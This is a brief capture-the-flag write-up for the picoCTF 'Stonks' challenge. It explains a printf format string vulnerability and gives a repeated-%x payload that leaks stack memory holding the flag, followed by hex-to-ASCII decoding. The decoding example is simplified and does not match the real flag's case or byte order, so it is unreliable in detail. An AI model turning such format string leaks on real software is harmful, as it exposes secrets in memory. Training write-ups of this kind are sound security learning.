# Stonks Writeup

**Flag**: `picoCTF{...}` (retrieved via format string leak)

---

## Summary

This binary reads a fake API token from user input with `scanf("%300s", user_buf)` and then **prints it directly with `printf(user_buf)`**, introducing a format string vulnerability.

We can exploit this to leak data from the stack. The flag is loaded into memory before this point and ends up on the stack, allowing us to read it using `%x`.

---

## Exploit Strategy

* Select option `1` to buy stonks

* When prompted for API token, input a long `%x` spam like:

  ```
  %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
  ```

* One of the outputs will contain the flag (hex-encoded)

* Repeat and adjust the number of `%x` if needed to fully leak it

* Reconstruct the flag from hex dump

---

## Reverse Flag

Once leaked, convert the hex output to ASCII.

For example, if you see something like:

```
5049434f4354467b4d345f4c33745f
```

Split into bytes:

```
50 49 43 4f 43 54 46 7b 4d 34 5f 4c 33 74 5f
```

Convert to ASCII:

```
P I C O C T F { M 4 _ L 3 t _
```

Keep reading to get the rest.

---

## TL;DR

```
1
%x%x%x%x%x%x%x%x%x%x%x%x%x
```

Find the flag in the output. Convert hex to ASCII. Done.
I used cyberchef for ease of access but realistically this should be done in automation script :)
